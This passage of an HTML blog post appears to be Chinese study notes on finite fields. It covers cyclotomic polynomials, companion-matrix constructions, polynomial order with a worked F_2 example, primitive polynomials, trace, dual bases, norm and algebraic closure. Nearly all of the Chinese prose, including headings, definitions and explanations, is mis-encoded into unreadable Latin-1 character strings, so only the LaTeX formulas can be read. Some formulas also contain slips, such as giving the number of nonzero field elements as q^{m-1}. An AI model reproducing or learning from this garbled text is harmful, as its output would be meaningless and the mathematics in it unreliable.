src="/2024/08/11/%E7%AD%91%E5%9F%BA%E7%AF%87%C2%B7%E6%8A%BD%E8%B1%A1%E4%BB%A3%E6%95%B0%C2%B7%E6%9C%89%E9%99%90%E5%9F%9F/image-20240821114313909.png" alt="å‡ ä½•æ„ä¹‰"></p></blockquote><h3 id="åˆ†åœ†å¤šé¡¹å¼-cyclotomic-polynomial"><a href="#åˆ†åœ†å¤šé¡¹å¼-cyclotomic-polynomial" class="headerlink" title="åˆ†åœ†å¤šé¡¹å¼ (cyclotomic polynomial)"></a>åˆ†åœ†å¤šé¡¹å¼ (cyclotomic polynomial)</h3><ul><li>$K$çš„ç‰¹å¾ä¸æ˜¯$n$çš„å› å­ï¼Œåˆ™$x^n-e$åœ¨$K^(n)$é‡Œçš„æ ¹å½¢æˆä¹˜æ³•å¾ªç¯ç¾¤$E^{(n)}$</li><li>$E^{(n)}:n$ä¸ªå…ƒç´ ï¼Œ$\phi(n)$ä¸ª<strong>ç”Ÿæˆå…ƒ$(n$æ¬¡æœ¬åŸå•ä½æ ¹)</strong></li></ul><p><strong>å®šä¹‰(åˆ†åœ†å¤šé¡¹å¼)</strong>:</p><p>åŸŸ$K$çš„ç‰¹å¾ä¸æ˜¯æ­£æ•´æ•°$n$çš„å› å­ï¼Œ$a_1,â€¦,a_r$<br>æ˜¯Kä¸Šæ‰€æœ‰$n$æ¬¡æœ¬åŸå•ä½æ ¹ï¼Œåˆ™å¤šé¡¹å¼</p><script type="math/tex; mode=display">Q_n(x)=\prod_{i=1}^r(x-a_i)</script><p>ç§°ä¸º$K$ä¸Š<strong>$n$æ¬¡åˆ†åœ†å¤šé¡¹å¼</strong>ï¼Œå…¶ä¸­$r=\phi(n)$ã€‚</p><p>å®šä¹‰(åˆ†åœ†å¤šé¡¹å¼):åŸŸ$K$çš„ç‰¹å¾ä¸æ˜¯æ­£æ•´æ•°$n$çš„å› å­ï¼Œ$a$æ˜¯$K$ä¸Šçš„<br>ä¸€ä¸ª$n$æ¬¡æœ¬åŸå•ä½æ ¹ï¼Œåˆ™å¤šé¡¹å¼</p><script type="math/tex; mode=display">Q_n(x)=\prod_{s=1}^n(x-a^s)\\gcd(s,n)=1</script><p>ç§°ä¸º$K$ä¸Š<strong>$n$æ¬¡åˆ†åœ†å¤šé¡¹å¼ã€‚</strong></p><p><strong>å®šç†1</strong>:Kçš„ç‰¹å¾ä¸æ˜¯æ­£æ•´æ•°$n$çš„å› å­ï¼Œåˆ™$x^n-e=\prod_{d|n}Q_d(x)$</p><p><strong>å¼•ç†</strong>ï¼š$d$æ˜¯æ­£æ•´æ•°$n$çš„çœŸå› å­ $(1\leq d&lt;n)$,åˆ™$Q_n(x)\mid\frac{x^n-e}{x^d-e}$</p><h3 id="åŸºäºåˆ†åœ†åŸŸæ„é€ æœ‰é™åŸŸ"><a href="#åŸºäºåˆ†åœ†åŸŸæ„é€ æœ‰é™åŸŸ" class="headerlink" title="åŸºäºåˆ†åœ†åŸŸæ„é€ æœ‰é™åŸŸ"></a>åŸºäºåˆ†åœ†åŸŸæ„é€ æœ‰é™åŸŸ</h3><p><strong>å®šç†1ï¼š</strong>æœ‰é™åŸŸ$F$çš„ç‰¹å¾ä¸æ˜¯æ­£æ•´æ•°$n$çš„å› å­ï¼Œåˆ™</p><p>$(1)Q_n(x)$å¯ä»¥åˆ†è§£ä¸º$F[X]$é‡Œ$\phi(n)/d$ä¸ªä¸åŒçš„åº¦ä¸º$d$çš„é¦–ä¸€ä¸å¯çº¦å¤šé¡¹å¼çš„ä¹˜ç§¯ï¼Œ$d$ æ˜¯æ»¡è¶³$q^d\equiv1\left(modn\right)$çš„æœ€å°æ­£æ•´æ•°ã€‚<br>$(2)F^{(n)}$æ˜¯è¿™äº›å¤šé¡¹å¼çš„åˆ†è£‚åŸŸ<br>$(3)\left[F^{(n)}{:}F\right]=d$ã€‚è®¾$F=F_q$,åˆ™ $F^{(n)}=F_{q^d}$</p><p><strong>å®šç†2ï¼š</strong>æœ‰é™åŸŸ$K$æ˜¯$F_q$çš„ä»»æ„å­åŸŸï¼Œåˆ™$F_q$æ˜¯$K$ä¸Šçš„$q-1$æ¬¡åˆ†åœ†åŸŸ</p><blockquote><p>ä¾‹ï¼š$F_{16}$æ˜¯$F_2$ã€$F_4$ã€$F_8$ä¸Šçš„15æ¬¡åˆ†åœ†åŸŸ</p></blockquote><p>åŸºäºâ€œåˆ†åœ†åŸŸâ€æ„é€ æœ‰é™åŸŸ</p><p>è®¾$F_p$æ˜¯$F_q$çš„å­åŸŸï¼Œåˆ™$F_q$æ˜¯$F_p$ä¸Šçš„$q-1$æ¬¡åˆ†åœ†åŸŸ</p><ol><li>åœ¨$F_p[X]$é‡Œåˆ†è§£$Q_{q-1}(x)\in F_p[X]$ä¸ºé¦–ä¸€ä¸å¯çº¦å¤šé¡¹å¼çš„ä¹˜ç§¯</li><li>æ±‚å‡ºä»»æ„ä¸€ä¸ªé¦–ä¸€ä¸å¯çº¦å¤šé¡¹å¼çš„æ ¹$a$,æ˜“çŸ¥$a\in F_q$æ˜¯æœ¬åŸå…ƒ</li><li>$\theta , \boldsymbol{a}, \boldsymbol{a}^2, . . . , \boldsymbol{a}^{q- 1}$å°±æ˜¯$F_q$é‡Œçš„å…ƒç´ </li></ol><hr><h2 id="æœ‰é™åŸŸçš„çŸ©é˜µè¡¨ç¤º"><a href="#æœ‰é™åŸŸçš„çŸ©é˜µè¡¨ç¤º" class="headerlink" title="æœ‰é™åŸŸçš„çŸ©é˜µè¡¨ç¤º"></a>æœ‰é™åŸŸçš„çŸ©é˜µè¡¨ç¤º</h2><h3 id="ä¼´éšçŸ©é˜µ-companion-matrix"><a href="#ä¼´éšçŸ©é˜µ-companion-matrix" class="headerlink" title="ä¼´éšçŸ©é˜µ(companion matrix)"></a>ä¼´éšçŸ©é˜µ(companion matrix)</h3><p><strong>å®šä¹‰(ä¼´éšçŸ©é˜µ):</strong>è®¾$K$æ˜¯åŸŸï¼Œ$f(x)=a_0+a_1x+\cdots+a_{n-1}x^{n-1}+x^n\in$<br>$K[X]$æ˜¯é¦–ä¸€å¤šé¡¹å¼ã€‚$f(x)$çš„ä¼´éšçŸ©é˜µæ˜¯å¦‚ä¸‹çš„$n\times n$çŸ©é˜µï¼š<img src="https://img.simpletex.net/pdf/BzBdZhBa/fQEB1mkZp284u22sUFSrikvtsU9gt5e7e.png" alt></p><script type="math/tex; mode=display">f(A)=a_0I+a_1A+\cdots+a_{n-1}A^{n-1}+A^n=\theta</script><p>å…¶ä¸­ï¼Œ$I$ä¸º$n\times n$å•ä½çŸ©é˜µ</p><h3 id="åŸºäºâ€œä¼´éšçŸ©é˜µâ€æ„é€ æœ‰é™åŸŸ"><a href="#åŸºäºâ€œä¼´éšçŸ©é˜µâ€æ„é€ æœ‰é™åŸŸ" class="headerlink" title="åŸºäºâ€œä¼´éšçŸ©é˜µâ€æ„é€ æœ‰é™åŸŸ"></a>åŸºäºâ€œä¼´éšçŸ©é˜µâ€æ„é€ æœ‰é™åŸŸ</h3><p>ä¸€.è®¾$f(x)\in F_p\left[X\right]$æ˜¯<strong>é¦–ä¸€ä¸å¯çº¦å¤šé¡¹å¼</strong>ï¼Œåº¦ä¸º$n$</p><ol><li>$A$æ˜¯$f(x)$çš„ä¼´éšçŸ©é˜µï¼Œåˆ™æœ‰ $f(A)=\theta$</li><li>æ„é€ ä¸€ç»„åŸº$I,A,â€¦,A^{n-1}$</li><li>$F_{p^n}$çš„å…ƒç´ ä¸º $b_0I+b_1A+\cdots+b_{n-1}A^{n-1}$,å…¶ä¸­ $b_0,b_1,â€¦,b_{n-1}\in F_p$</li></ol><p>äºŒ.$è®¾F_qæ˜¯F_pçš„æ‰©åŸŸ,åˆ™F_qæ˜¯F_pä¸Šçš„q-1æ¬¡åˆ†åœ†åŸŸ$</p><ol><li>$Q_{q-1}(x)åˆ†è§£ä¸ºé¦–ä¸€ä¸å¯çº¦å¤šé¡¹å¼çš„ä¹˜ç§¯,f(x)æ˜¯å…¶ä¸­ä¸€ä¸ªå¤šé¡¹å¼ã€‚$</li><li>$ä»¤Cæ˜¯f(x)çš„ä¼´éšçŸ©é˜µ,åˆ™f(C)=\theta,æœ‰Q_{q-1}(C)=\theta$</li><li>$Cæ˜¯Q_{q-1}(x)çš„æ ¹,ä¹Ÿæ˜¯F_qçš„æœ¬åŸå…ƒ$</li><li>$F_qçš„å…ƒç´ ä¸º\theta,C,\ldots,C^{q-1}$</li></ol><hr><h2 id="å¤šé¡¹å¼çš„é˜¶-order"><a href="#å¤šé¡¹å¼çš„é˜¶-order" class="headerlink" title="å¤šé¡¹å¼çš„é˜¶(order)"></a>å¤šé¡¹å¼çš„é˜¶(order)</h2><script type="math/tex; mode=display">\begin{aligned}&\text{å®šä¹‰(å¤šé¡¹å¼çš„é˜¶):åˆç§°å¤šé¡¹å¼çš„å‘¨æœŸ(period)ã€å¤šé¡¹å¼çš„æŒ‡æ•°}\\&(\text{exponent)ã€‚è®¾}f(x)\text{æ˜¯æœ‰é™åŸŸä¸Šçš„éé›¶å¤šé¡¹å¼,åˆ™}\\&Â·f(x)çš„å¸¸æ•°é¡¹ä¸ä¸ºé›¶å…ƒ:ä½¿å¾—f(x)|(x^n-e)çš„æœ€å°æ­£æ•´æ•°n,\\&\text{ç§°ä¸º}f(x)\text{çš„é˜¶,è®°ä¸º }ord\left(f(x)\right)\text{ã€‚}\\&Â·f(x)\text{çš„å¸¸æ•°é¡¹ä¸ºé›¶å…ƒ:è®¾}f(x)=x^tf^{\prime}(x)\text{(}f^{\prime}(x)\text{çš„å¸¸æ•°é¡¹ä¸ä¸ºé›¶}\\&\text{å…ƒ),åˆ™ }ord\left(f(x)\right)=ord\left(f^{\prime}(x)\right)\end{aligned}</script><p><strong>æ€§è´¨</strong>ï¼šè®¾$f(x)\in F_q[X]$æ˜¯éå¸¸æ•°å¤šé¡¹å¼ï¼Œå®ƒçš„å¸¸æ•°é¡¹ä¸ä¸ºé›¶å…ƒï¼Œåˆ™å­˜åœ¨æ­£æ•´æ•°$n\leq q^m-1$,ä½¿å¾—$f(x)|(x^n-e)$<br>ç‰¹åˆ«åœ°ï¼š</p><ol><li><strong>å¸¸æ•°å¤šé¡¹å¼çš„é˜¶ä¸º1</strong> (è¯æ˜ï¼šè®¾$a\in F_q[X]$æ˜¯å¸¸æ•°å¤šé¡¹å¼ï¼Œåˆ™ $x-e=aa^{-1}(x-$<br>$e)$,æœ‰$a|(x-e)$,å³$ord(a)=1)$</li><li><strong>å¤šé¡¹å¼$x$ çš„é˜¶ä¸º1</strong> (è¯æ˜ï¼šè®¾$f(x)=x$,å¸¸æ•°é¡¹ä¸ºé›¶å…ƒï¼Œåˆ™ $f(x)=xf^{\prime}(x)ï¼Œfâ€™(x)=e\text{,æœ‰}ord\big(f(x)\big)=ord(fâ€™(x))=ord(e)=1\big)$</li></ol><h3 id="è®¡ç®—å¤šé¡¹å¼çš„é˜¶"><a href="#è®¡ç®—å¤šé¡¹å¼çš„é˜¶" class="headerlink" title="è®¡ç®—å¤šé¡¹å¼çš„é˜¶"></a>è®¡ç®—å¤šé¡¹å¼çš„é˜¶</h3><ol><li>å°†å¤šé¡¹å¼f(x)å› å¼åˆ†è§£æˆé¦–ä¸€ä¸å¯çº¦å¤šé¡¹å¼çš„ä¹˜ç§¯</li><li>åˆ†åˆ«ç®—å‡ºè¿™äº›é¦–ä¸€ä¸å¯çº¦å¤šé¡¹å¼çš„é˜¶</li><li>ç”¨è¿™äº›é¦–ä¸€ä¸å¯çº¦å¤šé¡¹å¼çš„é˜¶ç®—å‡ºf(x)çš„é˜¶</li></ol><p><strong>å®šç†1</strong>ï¼šè®¾ $f(x)=g_1(x)g_2(x)â€¦g_k(x)$æ˜¯æœ‰é™åŸŸä¸Šçš„å¤šé¡¹å¼ï¼Œ$g_1(x),â€¦,g_k(x)$ä¸¤ä¸¤äº’ç´ çš„éé›¶å¤šé¡¹å¼ï¼Œåˆ™</p><p>$ord(f(x))=lcm(ord(g_1(x)),â€¦,ord(g_k(x)))$ã€‚</p><p><strong>å®šç†2</strong>ï¼š$g(x)\in F_q[X]$æ˜¯ä¸å¯çº¦å¤šé¡¹å¼ï¼Œåº¦ä¸º$m$,é˜¶ä¸º$n$,å¸¸æ•°<br>é¡¹ä¸ä¸ºé›¶å…ƒã€‚$a\in F_{q^m}^*,g(a)=\theta$,åˆ™ $n$ç­‰äº$a$åœ¨$F_q^m$é‡Œçš„é˜¶</p><p><strong>æ¨è®º</strong>ï¼š$g(x)\in F_q[X]æ˜¯ä¸å¯çº¦å¤šé¡¹å¼ï¼Œåº¦ä¸ºmï¼Œåˆ™ord(g(x))|(q^m-1)$</p><p><strong>å®šç†3</strong>ï¼š$g(x)\in F_q[X]$æ˜¯ä¸å¯çº¦å¤šé¡¹å¼ï¼Œé˜¶ä¸º$n$,å¸¸æ•°é¡¹ä¸ä¸ºé›¶å…ƒï¼Œåˆ™$ord( g( \boldsymbol{x}) ^b) = \boldsymbol{n}p^t$ $( \boldsymbol{b}$æ˜¯æ­£æ•´æ•°),å…¶ä¸­$p$æ˜¯$F_q$çš„ç‰¹å¾,$t$æ˜¯æ»¡è¶³$p^t\geq b$çš„æœ€å°æ•´æ•°ã€‚</p><p><strong>å®šç†4</strong>ï¼š$f(x)\in F_q[X]\text{æ˜¯éå¸¸æ•°å¤šé¡¹å¼,å®ƒçš„å¸¸æ•°é¡¹ä¸ä¸ºé›¶å…ƒ,}$</p><p>$f(x)=ag_1^{b_1}(x)â€¦g_k^{b_k}(x)$</p><p>$a\in F_q,b_1,â€¦,b_k\text{æ˜¯æ­£æ•´æ•°,}g_1(x)â€¦,g_k(x)\in F_q[X]\text{æ˜¯ä¸¤ä¸¤äº’ç´ çš„é¦–ä¸€ä¸å¯çº¦å¤šé¡¹å¼,åˆ™ }$</p><p>$ord(f(x))=np^t\text{,å…¶ä¸­}p\text{æ˜¯}F_q\text{çš„ç‰¹å¾,}t\text{æ˜¯æ»¡è¶³}p^t\geq max(b_1,â€¦,b_k)\text{ çš„æœ€å°æ•´æ•°,}$</p><p>$n=lcm(ord(g_1(x)),â€¦,ord(g_k(x)))\text{ã€‚}$</p><blockquote><script type="math/tex; mode=display">\begin{aligned}&\text{ä¾‹ï¼š}f(x)=x^{10}+x^9+x^3+x^2+e\in F_2[X] \\&1.f(x)=\left(x^2+x+e\right)^3(x^4+x+e) \\&2.\left(x^2+x+e\right)^3\text{çš„é˜¶ä¸º12} \\&3.x^4+x+e\text{çš„é˜¶ä¸º15}(å®šç†2ã€æ¨è®º) \\&4.f(x)\text{çš„é˜¶ä¸º}lcm(12,15)=60(å®šç†1) \end{aligned}</script></blockquote><hr><h2 id="æœ¬åŸå¤šé¡¹å¼-primitive-polynomial"><a href="#æœ¬åŸå¤šé¡¹å¼-primitive-polynomial" class="headerlink" title="æœ¬åŸå¤šé¡¹å¼(primitive polynomial)"></a>æœ¬åŸå¤šé¡¹å¼(primitive polynomial)</h2><p>æœ‰é™åŸŸé‡Œæœ¬åŸå…ƒçš„æå°å¤šé¡¹å¼</p><p><strong>å®šä¹‰(æœ¬åŸå¤šé¡¹å¼):</strong> $f(x)\in F_q[X]$æ˜¯éå¸¸æ•°å¤šé¡¹å¼ï¼Œåº¦ä¸º$m$,è®¾$a\in F_q^m$æ˜¯æœ¬åŸå…ƒï¼Œå¦‚æœ$f(x)$æ˜¯$a$åœ¨$F_q$ä¸Šçš„æå°å¤šé¡¹å¼ï¼Œåˆ™$f(x)$ç§°ä¸º$F_q$ä¸Šçš„æœ¬åŸå¤šé¡¹å¼ã€‚</p><ul><li>æå°å¤šé¡¹å¼$\Rightarrow$ä¸å¯çº¦å¤šé¡¹å¼ï¼Œåˆ™ æœ¬åŸå¤šé¡¹å¼$\Rightarrow$ä¸å¯çº¦å¤šé¡¹å¼</li><li>$f( a) = \theta$, $a\in F_{q^m}$æ˜¯æœ¬åŸå…ƒï¼Œåˆ™ $f(x)$çš„æ ¹$a$æ˜¯$F_q^m$çš„ç”Ÿæˆå…ƒ</li></ul><p>$å®šç†1:f(x)\in F_q[X]$,åº¦ä¸º$m$,åˆ™ $f(x)$æ˜¯$F_q$ä¸Šçš„æœ¬åŸå¤šé¡¹å¼$\Leftrightarrow f(x)$æ˜¯é¦–ä¸€çš„ï¼Œå¸¸æ•°é¡¹éé›¶å…ƒï¼Œ$ord(f(x))=q^m-1$</p><script type="math/tex; mode=display">\begin{aligned}&\text{å®šç†2:}f(x)\in F_q[X]\text{æ˜¯éå¸¸æ•°é¦–ä¸€å¤šé¡¹å¼,åº¦ä¸º}m\text{,}a=(-1)^mf(0)\text{,åˆ™}\\&f(x)\text{æ˜¯}F_q\text{ä¸Šçš„æœ¬åŸå¤šé¡¹å¼}\Leftrightarrow a\in F_q\text{æ˜¯æœ¬åŸå…ƒ,}r=\frac{q^m-1}{q-1}\text{æ˜¯æ»¡è¶³ }x^r\mathrm{~mod~}f(x)\\&\text{ç­‰äº}F_q\text{çš„æŸä¸ªå…ƒç´ çš„æœ€å°æ­£æ•´æ•°ã€‚å¦å¤–,}f(x)\text{æ˜¯}F_q\text{ä¸Šçš„æœ¬åŸå¤šé¡¹å¼}\Longrightarrow x^r\equiv\\&a\left(mod\ f(x)\right)ã€‚\end{aligned}</script><hr><h2 id="æ„é€ ä¸å¯çº¦å¤šé¡¹å¼"><a href="#æ„é€ ä¸å¯çº¦å¤šé¡¹å¼" class="headerlink" title="æ„é€ ä¸å¯çº¦å¤šé¡¹å¼"></a>æ„é€ ä¸å¯çº¦å¤šé¡¹å¼</h2><h3 id="æ„é€ æå°å¤šé¡¹å¼"><a href="#æ„é€ æå°å¤šé¡¹å¼" class="headerlink" title="æ„é€ æå°å¤šé¡¹å¼"></a>æ„é€ æå°å¤šé¡¹å¼</h3><p>æå°å¤šé¡¹å¼æœ¬è´¨ä¸Šæ˜¯ä¸€ç§ä¸å¯çº¦å¤šé¡¹å¼ï¼Œè¦æ„é€ ä¸å¯çº¦å¤šé¡¹å¼ï¼Œæ„é€ ä¸€ä¸ªæå°å¤šé¡¹å¼å³å¯ã€‚</p><p>$F_q:$åŸºåŸŸ<br>$F_{q^m}:$å‘é‡ç©ºé—´<br>$a\in F_{q^m}:$å®šä¹‰å…ƒç´ <br>$e,a,â€¦,a^{m-1}:$åŸº<br>è®¾$b\in F_{q^m}$çš„æå°å¤šé¡¹å¼æ˜¯$g(x)=d_0+d_1x+\cdots+d_mx^m\in F_q[X]$ ,åˆ™$g(b)=\theta$ </p><h3 id="æ„é€ æœ¬åŸå¤šé¡¹å¼-primitive-polynomial"><a href="#æ„é€ æœ¬åŸå¤šé¡¹å¼-primitive-polynomial" class="headerlink" title="æ„é€ æœ¬åŸå¤šé¡¹å¼(primitive polynomial)"></a>æ„é€ æœ¬åŸå¤šé¡¹å¼(primitive polynomial)</h3><p><strong>å®šä¹‰(æœ¬åŸå¤šé¡¹å¼)</strong>:$f(x)\in F_q[X]$æ˜¯éå¸¸æ•°å¤šé¡¹å¼ï¼Œåº¦ä¸º$m$,è®¾$a\in F_q^m$æ˜¯æœ¬åŸå…ƒï¼Œå¦‚æœ$f(x)$æ˜¯$a$åœ¨$F_q$ä¸Šçš„æå°å¤šé¡¹å¼ï¼Œåˆ™$f(x)$ç§°ä¸º$F_q$ä¸Šçš„æœ¬åŸå¤šé¡¹å¼ã€‚</p><p>$F_{q^m}$é‡Œéé›¶å…ƒç´ ä¸ªæ•°$:q^{m-1}$ æœ¬åŸå…ƒçš„é˜¶ï¼š$q^m-1$</p><p>è®¾ $q^m-1=h_1â€¦h_k$,å…¶ä¸­æ­£æ•´æ•°$h_1,â€¦,h_k$å½¼æ­¤äº’ç´ ï¼Œè®¾éé›¶å…ƒç´  $a_i\in F_{q^m}^*$çš„é˜¶ä¸º$h_i$,åˆ™<br>$c=a_1â€¦a_k$çš„é˜¶ä¸º$q^m-1$,</p><p>å³ $c\in F_q^m$æ˜¯æœ¬åŸå…ƒã€‚</p><p><strong>å®šç†</strong>ï¼šè®¾ $g(x)$æ˜¯$F_q$ä¸Šåº¦ä¸º$m$çš„ä¸å¯çº¦å¤šé¡¹å¼ï¼Œ$c\in F_{q^m},g(c)=\theta$,åˆ™$g(x)$çš„æ ¹ä¸º$c,c^q,c^{q^2},\dots ,c^{q^{m-1}}$</p><hr><h2 id="è¿¹-trace"><a href="#è¿¹-trace" class="headerlink" title="è¿¹(trace)"></a>è¿¹(trace)</h2><p><strong>å®šä¹‰(è¿¹)</strong>:<script type="math/tex">è®¾ a\in F=F_{q^m}, K=F_q, aåœ¨Kä¸Šçš„è¿¹Tr_{F/K}(a)å®šä¹‰ä¸º\\Tr_{F/K}(a)=a+a^q+\cdots+a^{q^{m-1}}\\å¦‚æœKæ˜¯ç´ å­åŸŸ,Tr_{F/K}(a)ç§°ä¸ºâ€œç»å¯¹è¿¹â€(absolute trace),ç®€è®°ä¸ºTr_F(a)</script></p><p><strong>è¿¹çš„å€¼åŸŸæ˜¯å­åŸŸKï¼Œç®—å‡ºæ¥æ˜¯Kä¸­çš„ä¸€ä¸ªå…ƒç´ </strong></p><h3 id="ç‰¹å¾å¤šé¡¹å¼-characteristic-polynomial"><a href="#ç‰¹å¾å¤šé¡¹å¼-characteristic-polynomial" class="headerlink" title="ç‰¹å¾å¤šé¡¹å¼ (characteristic polynomial)"></a>ç‰¹å¾å¤šé¡¹å¼ (characteristic polynomial)</h3><p><strong>å®šä¹‰ (ç‰¹å¾å¤šé¡¹å¼)</strong>:è®¾ $g(x)\in K[X]$æ˜¯$a$åœ¨$K$ä¸Šçš„æå°å¤šé¡¹å¼ã€‚$g(x)$çš„åº¦ä¸º$d,d\mid m$,åˆ™ $g(x)^{m/d}\in K[X]$ ç§°ä½œ$a$åœ¨$K$ä¸Šçš„ç‰¹å¾å¤šé¡¹å¼ã€‚</p><script type="math/tex; mode=display">\text{è®¾ }g(x)^{m/d}=a_0+a_1x+\cdots+a_{m-1}x^{m-1}+x^m\text{ã€‚}g(x)\text{ çš„æ ¹æ˜¯}\\a,a^q,...,a^{q^{d-1}}\in F,\text{ åˆ™ }g(x)^{m/d}\text{çš„æ ¹æ˜¯ }a,a^q,...,a^{q^{m-1}}\in F,\text{ æœ‰}\\g(x)^{m/d}=(x-a)(x-a^q)...(x-a^{q^{m-1}})ã€‚\\\text{æ•´ç† }g(x)^{m/d}\text{ çš„ä¸¤ä¸ªè¡¨è¾¾å¼å¯çŸ¥,}Tr_{F/K}(a)=-a_{m-1}\text{ã€‚}</script><p><strong>å®šä¹‰(è¿¹çš„ä¼ é€’æ€§)</strong>ï¼šè®¾ $F$æ˜¯$K$çš„æ‰©åŸŸï¼Œ$K$æ˜¯$L$çš„æ‰©åŸŸï¼Œå¯¹äºæ‰€æœ‰çš„$a\in F$,æœ‰<br>$Tr_{F/L}(a)=Tr_{K/L}(Tr_{F/K}(a))$</p><p><strong>è¿¹çš„æ€§è´¨</strong>ï¼š</p><p>è¿¹çš„æ€§è´¨ï¼šè®¾$F=F_q^m,K=F_q$,è¿¹å‡½æ•°$Tr_{F/K}$æ»¡è¶³ä»¥ä¸‹æ€§è´¨ï¼š<br>$(1)Tr_{F/K}(a+b)=Tr_{F/K}(a)+Tr_{F/K}(b)$,å¯¹äºæ‰€æœ‰$a,b\in F$<br>$(2)Tr_{F/K}(c\cdot a)=c\cdot Tr_{F/K}(a)$,å¯¹äºæ‰€æœ‰$c\in K,a\in F$<br>$(3)Tr_{F/K}$æ˜¯ä»$F$åˆ°Kçš„çº¿æ€§å˜æ¢ï¼Œå…¶ä¸­$F$å’Œ$K$éƒ½çœ‹ä½œæ˜¯$K$çš„å‘é‡ç©ºé—´<br>$(4)Tr_{F/K}(c)=mc$,å¯¹äºæ‰€æœ‰$c\in K$<br>$(5)Tr_{F/K}(a^q)=Tr_{F/K}(a)$,å¯¹äºæ‰€æœ‰$a\in F$</p><h3 id="è¿¹çš„åº”ç”¨"><a href="#è¿¹çš„åº”ç”¨" class="headerlink" title="è¿¹çš„åº”ç”¨"></a>è¿¹çš„åº”ç”¨</h3><p>$K=F_q:$åŸºåŸŸ<br>$F=F_{q^m}$:å‘é‡ç©ºé—´<br>$a_1,â€¦,a_m:$åŸº($å¯¹å¶åŸºï¼šb_1,â€¦,b_m$ï¼‰<br>è®¾$c\in F$,æœ‰$c=c_1a_1+\cdots+c_ma_m$<br>$= Tr_{F/ K}( b_1c) a_1+ \cdots + Tr_{F/ K}( b_mc) a_m$ ,<br>$b_1,â€¦,b_m\in F$<br>å…³ç³»å¼ï¼š$c_j=Tr_{F/K}(b_jc)$</p><script type="math/tex; mode=display">i\neq j:Tr_{F/K}(b_j a_i)=\theta\\i=j:Tr_{F/K}(b_j a_i)=e</script><h4 id="å¯¹å¶åŸº-dual-basis"><a href="#å¯¹å¶åŸº-dual-basis" class="headerlink" title="å¯¹å¶åŸº(dual basis)"></a>å¯¹å¶åŸº(dual basis)</h4><p><strong>å®šä¹‰ (å¯¹å¶åŸº)</strong>:è®¾$F$å’Œ$K$æ˜¯æœ‰é™åŸŸï¼Œ$F$æ˜¯Kçš„æ‰©åŸŸï¼Œ$\{a_1,â€¦,a_m\}$å’Œ$\{b_1,â€¦,b_m\}$<br>æ˜¯$K$ä¸Š$F$çš„ä¸¤ç»„åŸºã€‚å¦‚æœå¯¹äº$1\leq i,j\leq m$,æœ‰</p><script type="math/tex; mode=display">i\neq j:Tr_{F/K}(b_j\:a_i)=\theta\\i=j:Tr_{F/K}(b_j\:a_i)=e</script><p>åˆ™ $\{a_1,â€¦,a_m\}$å’Œ$\{b_1,â€¦,b_m\}$ç§°ä¸ºå¯¹å¶åŸºï¼Œä¹Ÿç§°äº’è¡¥åŸº (complementary basis)ã€‚<br>$\{a_1,â€¦,a_m\}=\{b_1,â€¦,b_m\}$æ—¶ï¼Œ$\{a_1,â€¦,a_m\}$å«è‡ªå¯¹å¶åŸº(self-dual basis)ã€‚</p><p>æ¯ä¸ªåŸºçš„å¯¹å¶åŸºï¼šéƒ½<strong>å­˜åœ¨</strong>ä¸”<strong>å”¯ä¸€</strong></p><hr><h2 id="èŒƒ-norm"><a href="#èŒƒ-norm" class="headerlink" title="èŒƒ(norm)"></a>èŒƒ(norm)</h2><p><strong>å®šä¹‰ (èŒƒ)</strong>: è®¾ $a\in F= F_q^m, K= F_q$, $a$åœ¨$K$ä¸Šçš„èŒƒ$N_F/K(a)$å®šä¹‰ä¸º<br>$N_{F/K}(a)=a\cdot a^q\cdot\cdots\cdot a^{q^{m-1}}=a^{\frac{q^m-1}{q-1}}$</p><p>è®¾ $g(x)\in K[X]$æ˜¯$a$åœ¨$K$ä¸Šçš„æå°å¤šé¡¹å¼ã€‚$g(x)$çš„åº¦ä¸º$d,d\mid m$,åˆ™<br>$g(x)^{m/d}\in K[X]$ ç§°ä½œ$a$åœ¨$K$ä¸Šçš„ç‰¹å¾å¤šé¡¹å¼ã€‚<br>è®¾$g(x)^{m/d}=a_0+a_1x+\cdots+a_{m-1}x^{m-1}+x^m$ã€‚$g(x)$çš„æ ¹æ˜¯<br>$a,a^q,â€¦,a^{q^{d-1}}\in F$,åˆ™ $g(x)^{m/d}$çš„æ ¹æ˜¯ $a,a^q,â€¦,a^{q^{m-1}}\in F$,æœ‰<br>$g(x)^{m/d}=(x-a)(x-a^q)â€¦(x-a^{q^{m-1}})$ã€‚<br>æ•´ç†$g(x)^{m/d}$çš„ä¸¤ä¸ªè¡¨è¾¾å¼å¯çŸ¥ï¼Œ$N_{F/K}(a)=(-1)^ma_0$ã€‚</p><p><strong>å®šä¹‰ (èŒƒçš„ä¼ é€’æ€§)</strong>:è®¾ $F$æ˜¯$K$çš„æ‰©åŸŸï¼Œ$K$æ˜¯$L$çš„æ‰©åŸŸï¼Œå¯¹äºæ‰€æœ‰çš„$a\in\mathcal{F}$,æœ‰$N_{F/L}(a)=N_{K/L}(N_{F/K}(a))$</p><script type="math/tex; mode=display">\begin{aligned}&\text{èŒƒçš„æ€§è´¨:è®¾ }F=F_{q^m}, K=F_q, \text{èŒƒå‡½æ•° }N_{F/K} \text{æ»¡è¶³ä»¥ä¸‹æ€§è´¨}:\\&(1) N_{F/K}(a\cdot b)=N_{F/K}(a)\cdot N_{F/K}(b)\text{,å¯¹äºæ‰€æœ‰}a,b\in F\\&(2) N_{F/K}\text{å°†}F\text{æ˜ å°„åˆ°}K\text{,å°†}F^*\text{æ˜ å°„åˆ°}K^*\\&(3) N_{F/K}(c)=c^m, \text{å¯¹äºæ‰€æœ‰}c\in K\\&(4) N_{F/K}(a^q)=N_{F/K}(a), \text{å¯¹äºæ‰€æœ‰}a\in F\end{aligned}</script><h2 id="ä»£æ•°é—­åŒ…-algebraic-closure"><a href="#ä»£æ•°é—­åŒ…-algebraic-closure" class="headerlink" title="ä»£æ•°é—­åŒ…(algebraic closure)"></a>ä»£æ•°é—­åŒ…(algebraic closure)</h2><script type="math/tex; mode=display">\begin{aligned}&\text{è®¾}K\text{æ˜¯åŸŸ,}K\text{çš„ä»£æ•°é—­åŒ…}\overline{K}\text{æ˜¯åŒ…å«}K\text{å’Œ}K[X]\text{é‡Œæ‰€æœ‰å¤šé¡¹å¼çš„æ ¹çš„æœ€}\text{å°æ‰©åŸŸã€‚}\\&\overline{K}=K(a_1,a_2,a_3,...)\\&\text{å…¶ä¸­,}a_1,a_2,a_3,...\text{æ˜¯}K[X]\text{é‡Œæ‰€æœ‰å¤šé¡¹å¼çš„æ ¹ã€‚}\end{aligned}</script><p>$\overline{K}$åŒ…å«$K$çš„æ‰€æœ‰ä»£æ•°å…ƒç´    